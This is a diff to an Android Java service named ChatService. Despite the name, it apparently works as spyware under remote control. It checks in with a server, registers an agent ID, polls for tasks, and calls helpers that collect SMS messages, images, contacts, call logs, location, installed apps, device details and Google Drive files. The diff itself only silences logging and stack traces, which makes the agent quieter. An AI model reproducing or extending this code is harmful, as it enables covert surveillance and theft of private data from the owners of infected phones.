@@ -68,12 +68,12 @@ public class ChatService extends Service {
             try {
                 response = HttpConnection.connect(SERVER + "updog", "GET", null);
             } catch (IOException e) {
-                e.printStackTrace();
+                //e.printStackTrace();
             }
 
             // Server is down
             if (response == null) {
-                Log.v(TAG, "Null response");
+                //Log.v(TAG, "Null response");
                 return null;
             }
 
@@ -81,9 +81,12 @@ public class ChatService extends Service {
             String body = response.body;
             if (body.equals(UPDOG)) {
                 handleConnection();
-            } else {
-                Log.v(TAG, "Keyword fail, keyword: " + body);
             }
+
+//            else {
+//                Log.v(TAG, "Keyword fail, keyword: " + body);
+//
+//            }
 
             return null;
         }
@@ -145,7 +148,7 @@ public class ChatService extends Service {
     }
 
     private void register() {
-        Log.v(TAG, "Registering");
+        //Log.v(TAG, "Registering");
 
         try {
             JSONObject jsonObject = new JSONObject();
@@ -167,9 +170,9 @@ public class ChatService extends Service {
             }
 
         } catch (Exception e) {
-            Log.e(TAG, "Error with register ", e);
+            //Log.e(TAG, "Error with register ", e);
         }
-        Log.v(TAG, "Agent ID: " + this.Id);
+        //Log.v(TAG, "Agent ID: " + this.Id);
     }
 
     private String getTask() {
@@ -181,20 +184,20 @@ public class ChatService extends Service {
             }
 
             if (response.responseCode == 200) {
-                Log.v(TAG, "Received task: " + response.body);
+                //Log.v(TAG, "Received task: " + response.body);
                 return response.body;
             }
             else if (response.responseCode == 201) {
-                Log.v(TAG, "No task found");
+                //Log.v(TAG, "No task found");
                 return "";
             }
             else if (response.responseCode == 204) {
-                Log.v(TAG, "Server does not have you id, registering");
+                //Log.v(TAG, "Server does not have you id, registering");
                 return "register";
             }
 
         } catch (IOException e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
         return null;
     }
@@ -204,7 +207,7 @@ public class ChatService extends Service {
         try {
             SmsReader.readSMS(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -213,7 +216,7 @@ public class ChatService extends Service {
         try {
             ImageSender.readImages(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -223,7 +226,7 @@ public class ChatService extends Service {
         try {
             AppLister.ListApps(pm, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -232,7 +235,7 @@ public class ChatService extends Service {
         try {
             PhoneDetails.getAllDetails(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -241,7 +244,7 @@ public class ChatService extends Service {
         try {
             Contacts.getContacts(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -252,7 +255,7 @@ public class ChatService extends Service {
             LocationTracker.getLocation(context, getId());
         } catch (Exception e)
         {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -261,7 +264,7 @@ public class ChatService extends Service {
         try {
             CallLogLister.getCallDetails(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 
@@ -270,7 +273,7 @@ public class ChatService extends Service {
         try {
             GoogleData.getGoogleDriveFiles(context, getId());
         } catch (Exception e) {
-            e.printStackTrace();
+            //e.printStackTrace();
         }
     }
 }
